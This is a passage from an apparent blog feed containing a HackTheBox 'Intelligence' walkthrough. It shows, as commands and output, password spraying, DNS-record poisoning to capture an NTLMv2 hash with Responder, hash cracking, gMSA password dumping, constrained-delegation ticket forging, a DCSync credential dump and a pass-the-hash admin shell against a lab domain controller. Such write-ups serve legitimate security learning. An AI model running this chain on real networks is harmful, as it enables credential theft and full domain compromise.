</span></span><span class="line"><span class="cl">$ rpcspray users.list password.list 10.10.10.248 <span class="p">|</span> grep -v <span class="s1">&#39;NT_STATUS_LOGON_FAILURE&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying: <span class="s1">&#39;Anita.Roberts:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying: <span class="s1">&#39;Brian.Baker:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying: <span class="s1">&#39;Brian.Morris:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying: <span class="s1">&#39;Tiffany.Molina:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class="line"><span class="cl">Account Name: Tiffany.Molina, Authority Name: intelligence
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying: <span class="s1">&#39;Travis.Evans:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying: <span class="s1">&#39;Veronica.Patel:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying: <span class="s1">&#39;William.Lee:NewIntelligenceCorpUser9876&#39;</span> 
</span></span></code></pre></div><h4 id="smb-revisit">SMB Revisit</h4>
<p>Enumerating SMB with <code>smbmap</code> now returns a list of shares that are accessible by Tifanny.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.97» 
</span></span><span class="line"><span class="cl">$ smbmap -H 10.10.10.248 -u <span class="s1">&#39;Tiffany.Molina&#39;</span> -p <span class="s1">&#39;NewIntelligenceCorpUser9876&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> IP: 10.10.10.248:445        Name: dc.intelligence.htb                               
</span></span><span class="line"><span class="cl">        Disk                                                    Permissions     Comment
</span></span><span class="line"><span class="cl">        ----                                                    -----------     -------
</span></span><span class="line"><span class="cl">        ADMIN$                                                  NO ACCESS       Remote Admin
</span></span><span class="line"><span class="cl">        C$                                                      NO ACCESS       Default share
</span></span><span class="line"><span class="cl">        IPC$                                                    READ ONLY       Remote IPC
</span></span><span class="line"><span class="cl">        IT                                                      READ ONLY
</span></span><span class="line"><span class="cl">        NETLOGON                                                READ ONLY       Logon server share 
</span></span><span class="line"><span class="cl">        SYSVOL                                                  READ ONLY       Logon server share 
</span></span><span class="line"><span class="cl">        Users                                                   READ ONLY
</span></span></code></pre></div><p>It turns out I can read the flag from the <code>Users</code> share.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ smbclient //intelligence.htb/Users -U <span class="s1">&#39;Tiffany.Molina%NewIntelligenceCorpUser9876&#39;</span>
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> ls Tiffany.Molina<span class="se">\D</span>esktop
</span></span><span class="line"><span class="cl">  .                                  DR        <span class="m">0</span>  Sun Apr <span class="m">18</span> 20:51:46 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  ..                                 DR        <span class="m">0</span>  Sun Apr <span class="m">18</span> 20:51:46 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  user.txt                           AR       <span class="m">34</span>  Thu Jul <span class="m">15</span> 08:17:40 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="m">3770367</span> blocks of size 4096. <span class="m">1444029</span> blocks available
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="access-as-tedgraves">Access as Ted.Graves</h3>
<h4 id="it-share">IT share</h4>
<p>On the <code>IT</code> share, there is a PowerShell script called <code>downdetector.ps1</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ smbclient //intelligence.htb/IT -U <span class="s1">&#39;Tiffany.Molina%NewIntelligenceCorpUser9876&#39;</span>
</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> ls
</span></span><span class="line"><span class="cl">  .                                   D        <span class="m">0</span>  Sun Apr <span class="m">18</span> 20:50:55 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  ..                                  D        <span class="m">0</span>  Sun Apr <span class="m">18</span> 20:50:55 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  downdetector.ps1                    A     <span class="m">1046</span>  Sun Apr <span class="m">18</span> 20:50:55 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="m">3770367</span> blocks of size 4096. <span class="m">1444112</span> blocks available
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> mget downdetector.ps1 
</span></span><span class="line"><span class="cl">Get file downdetector.ps1? y
</span></span><span class="line"><span class="cl">getting file <span class="se">\d</span>owndetector.ps1 of size <span class="m">1046</span> as downdetector.ps1 <span class="o">(</span>0.6 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.6 KiloBytes/sec<span class="o">)</span>
</span></span></code></pre></div><p>According to the comment it is said that this script is used to check web server status.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Check web server status. Scheduled to run every 5min</span>
</span></span><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="n">ActiveDirectory</span> 
</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$record</span> <span class="k">in</span> <span class="nb">Get-ChildItem</span> <span class="s2">&#34;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&#34;</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="n">Name</span> <span class="o">-like</span> <span class="s2">&#34;web*&#34;</span><span class="p">)</span>  <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="nv">$request</span> <span class="p">=</span> <span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="s2">&#34;http://</span><span class="p">$(</span><span class="nv">$record</span><span class="p">.</span><span class="n">Name</span><span class="p">)</span><span class="s2">&#34;</span> <span class="n">-UseDefaultCredentials</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(.</span><span class="n">StatusCode</span> <span class="o">-ne</span> <span class="n">200</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="nb">Send-MailMessage</span> <span class="n">-From</span> <span class="s1">&#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39;</span> <span class="n">-To</span> <span class="s1">&#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39;</span> <span class="n">-Subject</span> <span class="s2">&#34;Host: </span><span class="p">$(</span><span class="nv">$record</span><span class="p">.</span><span class="n">Name</span><span class="p">)</span><span class="s2"> is down&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">catch</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>If I re-query this line <code>DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb</code> with a filter of <code>name=web*</code> using <code>ldapsearch</code>, it returns the following record.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ ldapsearch -LLL -D <span class="s1">&#39;Tiffany.Molina@intelligence.htb&#39;</span> -w <span class="s1">&#39;NewIntelligenceCorpUser9876&#39;</span> -x -h 10.10.10.248 -b <span class="s2">&#34;DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&#34;</span> <span class="s2">&#34;name=web*&#34;</span>
</span></span><span class="line"><span class="cl">dn: <span class="nv">DC</span><span class="o">=</span>weboops,DC<span class="o">=</span>intelligence.htb,CN<span class="o">=</span>MicrosoftDNS,DC<span class="o">=</span>DomainDnsZones,DC<span class="o">=</span>intell
</span></span><span class="line"><span class="cl"> igence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">objectClass: top
</span></span><span class="line"><span class="cl">objectClass: dnsNode
</span></span><span class="line"><span class="cl">distinguishedName: <span class="nv">DC</span><span class="o">=</span>weboops,DC<span class="o">=</span>intelligence.htb,CN<span class="o">=</span>MicrosoftDNS,DC<span class="o">=</span>DomainDns
</span></span><span class="line"><span class="cl"> Zones,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">instanceType: <span class="m">4</span>
</span></span><span class="line"><span class="cl">whenCreated: 20210716071327.0Z
</span></span><span class="line"><span class="cl">whenChanged: 20210716071707.0Z
</span></span><span class="line"><span class="cl">uSNCreated: <span class="m">102869</span>
</span></span><span class="line"><span class="cl">uSNChanged: <span class="m">102872</span>
</span></span><span class="line"><span class="cl">showInAdvancedViewOnly: TRUE
</span></span><span class="line"><span class="cl">name: weboops
</span></span><span class="line"><span class="cl">objectGUID:: JGYq3NUoGU24w9fR4hg/6Q<span class="o">==</span>
</span></span><span class="line"><span class="cl">dnsRecord:: <span class="nv">CAAAAAUAAABMAAAAAAAAAAAAAAAAAAAA9mT1lRJ61wE</span><span class="o">=</span>
</span></span><span class="line"><span class="cl">objectCategory: <span class="nv">CN</span><span class="o">=</span>Dns-Node,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">dSCorePropagationData: 16010101000000.0Z
</span></span><span class="line"><span class="cl">dNSTombstoned: TRUE
</span></span><span class="line"><span class="cl">dc: weboops
</span></span></code></pre></div><p>So the script basically looks for any DNS record that starts with <code>web*</code>. For each record it finds, the script will check if the record is alive by issuing an HTTP request and if the response is not 200, the script will notify Ted Graves via email.</p>
<p>The key take away here is the wildcard (<code>*</code>).</p>
<h4 id="stealing-ntlmv2-response-via-adidns">Stealing NTLMv2 Response via ADIDNS</h4>
<p>According to <a href="https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/">this blog</a>, in AD, by default, any authenticated users can create a new DNS record (ADIDNS).</p>
<p>The idea here is I can try to create a DNS under <code>intelligence.htb</code>  (subdomain) that starts with <code>web*</code>. So when the script runs, it might hit the record I created and then perform NTLM authentication since the <code>Invoke-WebRequest</code> issued with the <code>-UseDefaultCredentials</code> flag.</p>
<p>Fortunately, a well-known security researcher, <a href="https://dirkjanm.io/">Dirk-jan</a> has already created a tool called <code>dnstool.py</code> to interact with ADIDNS. The tool was bundled with Krbrelayx repository, hence I&rsquo;ll clone it to my machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «/opt» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ git clone https://github.com/dirkjanm/krbrelayx.git <span class="o">&amp;&amp;</span> <span class="nb">cd</span> krbrelayx
</span></span><span class="line"><span class="cl">Cloning into <span class="s1">&#39;krbrelayx&#39;</span>...
</span></span><span class="line"><span class="cl">remote: Enumerating objects: 98, <span class="k">done</span>.
</span></span><span class="line"><span class="cl">remote: Total <span class="m">98</span> <span class="o">(</span>delta 0<span class="o">)</span>, reused <span class="m">0</span> <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused <span class="m">98</span>
</span></span><span class="line"><span class="cl">Receiving objects: 100% <span class="o">(</span>98/98<span class="o">)</span>, 65.76 KiB <span class="p">|</span> 426.00 KiB/s, <span class="k">done</span>.
</span></span><span class="line"><span class="cl">Resolving deltas: 100% <span class="o">(</span>48/48<span class="o">)</span>, <span class="k">done</span>.
</span></span></code></pre></div><p>Now I can add a new DNS record that points to my box IP with the following command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «krbrelayx» «10.10.14.75» git:<span class="o">(</span>master<span class="o">)</span> 
</span></span><span class="line"><span class="cl">$ python3 dnstool.py -u intelligence.htb<span class="se">\\</span>Tiffany.Molina -p <span class="s1">&#39;NewIntelligenceCorpUser9876&#39;</span> -r <span class="s1">&#39;web-iamf.intelligence.htb&#39;</span> -a add -d 10.10.14.75 10.10.10.248 
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Connecting to host...
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Binding to host
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Bind OK
</span></span><span class="line"><span class="cl">/opt/krbrelayx/dnstool.py:241: DeprecationWarning: please use dns.resolver.Resolver.resolve<span class="o">()</span> instead
</span></span><span class="line"><span class="cl">  <span class="nv">res</span> <span class="o">=</span> dnsresolver.query<span class="o">(</span>zone, <span class="s1">&#39;SOA&#39;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Adding new record
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> LDAP operation completed successfully
</span></span></code></pre></div><p>At the same time, I&rsquo;ll also start the Responder. Shortly after it runs, the Ted.Graves hash appear.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «krbrelayx» «10.10.14.75» git:<span class="o">(</span>master<span class="o">)</span> 
</span></span><span class="line"><span class="cl">$ sudo responder -I tun0
</span></span><span class="line"><span class="cl">                                         __
</span></span><span class="line"><span class="cl">  .----.-----.-----.-----.-----.-----.--<span class="p">|</span>  <span class="p">|</span>.-----.----.
</span></span><span class="line"><span class="cl">  <span class="p">|</span>   _<span class="p">|</span>  -__<span class="p">|</span>__ --<span class="p">|</span>  _  <span class="p">|</span>  _  <span class="p">|</span>     <span class="p">|</span>  _  <span class="o">||</span>  -__<span class="p">|</span>   _<span class="p">|</span>
</span></span><span class="line"><span class="cl">  <span class="p">|</span>__<span class="p">|</span> <span class="p">|</span>_____<span class="p">|</span>_____<span class="p">|</span>   __<span class="p">|</span>_____<span class="p">|</span>__<span class="p">|</span>__<span class="p">|</span>_____<span class="o">||</span>_____<span class="p">|</span>__<span class="p">|</span>
</span></span><span class="line"><span class="cl">                   <span class="p">|</span>__<span class="p">|</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">           NBT-NS, LLMNR <span class="p">&amp;</span> MDNS Responder 3.0.6.0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
</span></span><span class="line"><span class="cl">  To <span class="nb">kill</span> this script hit CTRL-C
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Listening <span class="k">for</span> events...                                                                                                          
</span></span><span class="line"><span class="cl"><span class="o">[</span>HTTP<span class="o">]</span> NTLMv2 Client   : 10.10.10.248
</span></span><span class="line"><span class="cl"><span class="o">[</span>HTTP<span class="o">]</span> NTLMv2 Username : intelligence<span class="se">\T</span>ed.Graves
</span></span><span class="line"><span class="cl"><span class="o">[</span>HTTP<span class="o">]</span> NTLMv2 Hash     : Ted.Graves::intelligence:4cca110e84677c
</span></span></code></pre></div><h4 id="cracking-the-hash">Cracking the Hash</h4>
<p>The hash can be cracked with <code>hashcat</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ ./hashcat.exe -m <span class="m">5600</span> hashes/intelligence-ted.graves.hash ../../rockyou.txt -O                     ✘ INT
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">TED.GRAVES::intelligence:4cca110e84677c33:3a689c04e699df8f6e1b16a599576aba:..<span class="o">[</span>SNIP<span class="o">]</span>..:Mr.Teddy
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Session..........: hashcat
</span></span><span class="line"><span class="cl">Status...........: Cracked
</span></span><span class="line"><span class="cl">Hash.Name........: NetNTLMv2
</span></span><span class="line"><span class="cl">Hash.Target......: TED.GRAVES::intelligence:4cca110e84677c33:3a689c04e...000000
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>The credentials are valid</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ crackmapexec smb 10.10.10.248 -u <span class="s1">&#39;Ted.Graves&#39;</span> -p <span class="s1">&#39;Mr.Teddy&#39;</span> 
</span></span><span class="line"><span class="cl">SMB         10.10.10.248    <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:intelligence.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</span></span></code></pre></div><h3 id="shell-as-administrator">Shell as Administrator</h3>
<h4 id="enumeration-with-bloodhound">Enumeration with BloodHound</h4>
<p>Even with user <code>Ted.Graves</code>, I still have no shell access. From here, I&rsquo;ll use BloodHound to explore more about the object relationships. I&rsquo;ll  use the Python ingestor.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «BloodHound.py» «10.10.14.75» git:<span class="o">(</span>master<span class="o">)</span> 
</span></span><span class="line"><span class="cl">$ python3 bloodhound.py -c All -u <span class="s1">&#39;Ted.Graves&#39;</span> -p <span class="s1">&#39;Mr.Teddy&#39;</span> -d intelligence.htb -dc dc.intelligence.htb -ns 10.10.10.248
</span></span><span class="line"><span class="cl">INFO: Found AD domain: intelligence.htb
</span></span><span class="line"><span class="cl">INFO: Connecting to LDAP server: dc.intelligence.htb
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">1</span> domains
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">1</span> domains in the forest
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">2</span> computers
</span></span><span class="line"><span class="cl">INFO: Connecting to LDAP server: dc.intelligence.htb
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">42</span> users
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">54</span> groups
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">0</span> trusts
</span></span><span class="line"><span class="cl">INFO: Starting computer enumeration with <span class="m">10</span> workers
</span></span><span class="line"><span class="cl">INFO: Querying computer: svc_int.intelligence.htb
</span></span><span class="line"><span class="cl">INFO: Querying computer: dc.intelligence.htb
</span></span><span class="line"><span class="cl">INFO: Skipping enumeration <span class="k">for</span> svc_int.intelligence.htb since it could not be resolved.
</span></span><span class="line"><span class="cl">INFO: Done in 00M 21S
</span></span></code></pre></div><p>Using the pre-built analytics queries “Shortest Path from Owned Principal” reveals that user <code>Ted.Graves</code> has <code>readGMSAPassword</code> permission on a service account called <code>SVC_INT</code>. And the service account has <code>AllowedToDelegate</code> permission (constrained delegation) on the DC/Machine.</p>
<p><div class="img-container"><img src="imgs/image-20210716110136841.png" alt="image-20210716110136841"  /></div>
</p>
<h4 id="read-svc_init-password">Read SVC_INIT Password</h4>
<p>According to the help feature, <code>readGMSAPassword</code> allows you to retrieve GMSA (Group Managed Service Account) password. I&rsquo;ll also note that the password might be changed after some periods just like computer account (default 30 days).</p>
<p><div class="img-container"><img src="imgs/image-20210716110314851.png" alt="image-20210716110314851"  /></div>
</p>
<p>The author of this box has already created a tool for abusing this permission: <a href="https://github.com/micahvandeusen/gMSADumper/blob/main/gMSADumper.py">gMSADumper.py</a>. Running it retuns the password of <code>svc_int$</code> in the form of NT hash.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ ./gMSADumper.py -u <span class="s1">&#39;Ted.Graves&#39;</span> -p <span class="s1">&#39;Mr.Teddy&#39;</span> -d intelligence.htb
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Users or groups who can <span class="nb">read</span> password <span class="k">for</span> svc_int$:
</span></span><span class="line"><span class="cl"> &gt; DC$
</span></span><span class="line"><span class="cl"> &gt; itsupport
</span></span><span class="line"><span class="cl">svc_int$:::d64b83fe606e6d3005e20ce0ee932fe2
</span></span></code></pre></div><p>Since the password is managed by the DC, I don&rsquo;t have to try to crack it.</p>
<h4 id="abusing-constrained-delegation---silver-ticket">Abusing Constrained Delegation -&gt; Silver Ticket</h4>
<p><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation">This site</a> explains what a constrained delegation is:</p>
<blockquote>
<p>If you have compromised a user account or a computer (machine account) that has kerberos constrained delegation enabled, it&rsquo;s possible to impersonate any domain user (including administrator) and authenticate to a service that the user account is trusted to delegate to.</p>
</blockquote>
<p>In this case, the service account <code>svc_int</code> can impersonate the domain admin and authenticate to <code>WWW/DC.INTELLIGENCE.HTB</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ ldapsearch -LLL -D <span class="s2">&#34;Ted.Graves@intelligence.htb&#34;</span> -w <span class="s2">&#34;Mr.Teddy&#34;</span> -x -h 10.10.10.248 -b <span class="s2">&#34;CN=svc_int,CN=Managed ServiceDC=intelligence,DC=htb&#34;</span> 
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">msDS-AllowedToDelegateTo: WWW/dc.intelligence.htb
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>With that, I can abuse this permission and perform <a href="https://attack.mitre.org/techniques/T1558/002/">Silver Ticket</a> attack, I&rsquo;ll use <code>impacket-getST</code> tool, but the result says clock skew too great.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ impacket-getST <span class="s1">&#39;intelligence.htb/svc_int$&#39;</span>  -spn <span class="s1">&#39;WWW\dc.intelligence.htb&#39;</span> -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate administrator
</span></span><span class="line"><span class="cl">Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Getting TGT <span class="k">for</span> user
</span></span><span class="line"><span class="cl">Kerberos SessionError: KRB_AP_ERR_SKEW<span class="o">(</span>Clock skew too great<span class="o">)</span>
</span></span></code></pre></div><p>To resolve that, I&rsquo;ll need to synchronize my machine time with the DC. This can be done with <code>ntpdate</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ sudo apt install ntpdate <span class="o">&amp;&amp;</span> sudo ntpdate 10.10.10.248
</span></span><span class="line"><span class="cl"><span class="m">18</span> Jul 14:57:39 ntpdate<span class="o">[</span>63324<span class="o">]</span>: adjust <span class="nb">time</span> server 10.10.10.248 offset +0.001305 sec
</span></span></code></pre></div><p>On the next attempt, I have obtained the admin ticket (TGS).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75»
</span></span><span class="line"><span class="cl">$ impacket-getST -spn <span class="s1">&#39;WWW/dc.intelligence.htb&#39;</span> -impersonate administrator -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -dc-ip 10.10.10.248 intelligence.htb/svc_int<span class="se">\$</span>
</span></span><span class="line"><span class="cl">Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Getting TGT <span class="k">for</span> user
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Impersonating administrator
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>     Requesting S4U2self
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>     Requesting S4U2Proxy
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in administrator.ccache
</span></span></code></pre></div><h4 id="dcsync">DCSync</h4>
<p>Although the admin ticket was actually requested for <code>WWW\dc.intelligence.htb</code>, it actually can be used for other service, like DRS (Directory Replication Service) for DCSync attack.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>administrator.ccache <span class="o">&amp;&amp;</span> impacket-secretsdump -k -no-pass dc.intelligence.htb -just-dc-user administrator
</span></span><span class="line"><span class="cl">Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span>id:rid:lmhash:nthash<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
</span></span><span class="line"><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:9075113fe16cf74f7c0f9b27e882dad3:::
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Kerberos keys grabbed
</span></span><span class="line"><span class="cl">Administrator:aes256-cts-hmac-sha1-96:75dcc603f2d2f7ab8bbd4c12c0c54ec804c7535f0f20e6129acc03ae544976d6
</span></span><span class="line"><span class="cl">Administrator:aes128-cts-hmac-sha1-96:9091f2d145cb1a2ea31b4aca287c16b0
</span></span><span class="line"><span class="cl">Administrator:des-cbc-md5:2362bc3191f23732
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Cleaning up...
</span></span></code></pre></div><h4 id="shell-access">Shell Access</h4>
<p>With the administrator hash, I can use WinRM to get a shell access</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.10.248 -u <span class="s1">&#39;administrator&#39;</span> -H <span class="s1">&#39;9075113fe16cf74f7c0f9b27e882dad3&#39;</span>        
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; hostname
</span></span><span class="line"><span class="cl">dc
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; ipconfig
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Windows IP Configuration
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Ethernet adapter Ethernet0 2:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Connection-specific DNS Suffix  . :
</span></span><span class="line"><span class="cl">   IPv6 Address. . . . . . . . . . . : dead:beef::a57a:d94f:fa40:87e6
</span></span><span class="line"><span class="cl">   Link-local IPv6 Address . . . . . : fe80::a57a:d94f:fa40:87e6%6
</span></span><span class="line"><span class="cl">   IPv4 Address. . . . . . . . . . . : 10.10.10.248
</span></span><span class="line"><span class="cl">   Subnet Mask . . . . . . . . . . . : 255.255.254.0
</span></span><span class="line"><span class="cl">   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%6
</span></span><span class="line"><span class="cl">                                       10.10.10.2
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - BountyHunter</title>
      <link>https://fahmifj.github.io/hackthebox/bountyhunter/</link>
